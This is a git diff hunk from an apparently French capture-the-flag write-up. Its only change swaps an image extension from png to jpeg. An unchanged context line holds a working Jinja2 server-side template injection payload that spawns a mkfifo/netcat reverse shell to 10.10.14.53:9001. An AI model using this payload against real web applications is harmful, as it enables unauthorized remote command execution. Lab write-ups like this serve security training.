@@ -135,7 +135,7 @@ Il ne reste plus qu'à modifier la commande id par un reverse shell mkfifo afin 
 
 `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.53 9001 >/tmp/f').read() }}`
 
-![](img/80-ssti-rev.png)
+![](img/80-ssti-rev.jpeg)
 
 ## Mouvement latéral - shaun
 
